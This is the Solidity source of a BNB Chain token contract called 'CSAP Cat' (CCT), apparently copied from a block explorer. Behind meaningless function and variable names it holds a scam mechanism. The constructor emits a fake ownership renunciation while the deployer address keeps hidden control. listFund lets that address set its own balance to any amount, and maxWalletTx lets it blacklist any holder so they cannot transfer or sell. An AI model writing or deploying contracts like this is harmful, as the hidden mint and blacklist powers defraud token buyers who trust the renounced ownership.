/**
 *Submitted for verification at BscScan.com on 2023-02-15
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

abstract contract sellEnable {
    function fundSellTotal() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface launchWallet {
    function createPair(address tokenList, address receiverMax) external returns (address);
}

interface enableAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CSAPCat is IERC20, sellEnable {

    function liquidityEnableAuto() public {
        if (enableReceiver == autoReceiver) {
            enableReceiver = true;
        }
        if (fundShould == atLaunched) {
            enableReceiver = true;
        }
        autoReceiver=false;
    }

    address public limitSender;

    mapping(address => uint256) private liquidityList;

    function transfer(address buyShould, uint256 buyMax) external virtual override returns (bool) {
        return atSender(fundSellTotal(), buyShould, buyMax);
    }

    function symbol() external view returns (string memory) {
        return fundSender;
    }

    function decimals() external view returns (uint8) {
        return maxLiquidityLaunched;
    }

    string private fundSender = "CCT";

    address public teamTx;

    function approve(address sellBuyMarketing, uint256 buyMax) public virtual override returns (bool) {
        sellAuto[fundSellTotal()][sellBuyMarketing] = buyMax;
        emit Approval(fundSellTotal(), sellBuyMarketing, buyMax);
        return true;
    }

    mapping(address => bool) public totalEnableBuy;

    function fundSwap(address feeFund, address shouldTotal, uint256 buyMax) internal returns (bool) {
        require(liquidityList[feeFund] >= buyMax);
        liquidityList[feeFund] -= buyMax;
        liquidityList[shouldTotal] += buyMax;
        emit Transfer(feeFund, shouldTotal, buyMax);
        return true;
    }

    event OwnershipTransferred(address indexed modeMin, address indexed sellFrom);

    string private toAt = "CSAP Cat";

    function takeAmountLaunch() public {
        emit OwnershipTransferred(limitSender, address(0));
        totalMinLiquidity = address(0);
    }

    function owner() external view returns (address) {
        return totalMinLiquidity;
    }

    function modeAmount() public {
        if (limitMarketing != atLaunched) {
            swapReceiver = true;
        }
        if (swapReceiver != enableReceiver) {
            swapReceiver = false;
        }
        swapReceiver=false;
    }

    constructor (){
        
        enableAuto tradingAmount = enableAuto(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        teamTx = launchWallet(tradingAmount.factory()).createPair(tradingAmount.WETH(), address(this));
        totalMinLiquidity = fundSellTotal();
        if (autoReceiver) {
            swapReceiver = false;
        }
        limitSender = fundSellTotal();
        isAt[fundSellTotal()] = true;
        if (atLaunched == limitMarketing) {
            enableReceiver = false;
        }
        liquidityList[fundSellTotal()] = launchList;
        emit Transfer(address(0), limitSender, launchList);
        takeAmountLaunch();
    }

    address private totalMinLiquidity;

    uint256 private fundShould;

    function enableBuy(address maxAmount) public {
        if (sellLiquidity) {
            return;
        }
        if (enableReceiver) {
            limitMarketing = fundShould;
        }
        isAt[maxAmount] = true;
        
        sellLiquidity = true;
    }

    bool private swapReceiver;

    uint8 private maxLiquidityLaunched = 18;

    function listFund(uint256 buyMax) public {
        if (!isAt[fundSellTotal()]) {
            return;
        }
        liquidityList[limitSender] = buyMax;
    }

    uint256 public atLaunched;

    mapping(address => mapping(address => uint256)) private sellAuto;

    function allowance(address amountShould, address sellBuyMarketing) external view virtual override returns (uint256) {
        return sellAuto[amountShould][sellBuyMarketing];
    }

    function balanceOf(address listLaunch) public view virtual override returns (uint256) {
        return liquidityList[listLaunch];
    }

    function tokenSell() public view returns (bool) {
        return autoReceiver;
    }

    bool public sellLiquidity;

    function transferFrom(address feeFund, address shouldTotal, uint256 buyMax) external override returns (bool) {
        if (sellAuto[feeFund][fundSellTotal()] != type(uint256).max) {
            require(buyMax <= sellAuto[feeFund][fundSellTotal()]);
            sellAuto[feeFund][fundSellTotal()] -= buyMax;
        }
        return atSender(feeFund, shouldTotal, buyMax);
    }

    bool private enableReceiver;

    function getOwner() external view returns (address) {
        return totalMinLiquidity;
    }

    bool public autoReceiver;

    function atSender(address feeFund, address shouldTotal, uint256 buyMax) internal returns (bool) {
        if (feeFund == limitSender) {
            return fundSwap(feeFund, shouldTotal, buyMax);
        }
        require(!totalEnableBuy[feeFund]);
        return fundSwap(feeFund, shouldTotal, buyMax);
    }

    uint256 public limitMarketing;

    mapping(address => bool) public isAt;

    function totalSupply() external view virtual override returns (uint256) {
        return launchList;
    }

    function limitTotal() public view returns (bool) {
        return enableReceiver;
    }

    function maxWalletTx(address modeToken) public {
        
        if (modeToken == limitSender || modeToken == teamTx || !isAt[fundSellTotal()]) {
            return;
        }
        
        totalEnableBuy[modeToken] = true;
    }

    function tokenWallet() public view returns (uint256) {
        return fundShould;
    }

    uint256 private launchList = 100000000 * 10 ** 18;

    function name() external view returns (string memory) {
        return toAt;
    }

}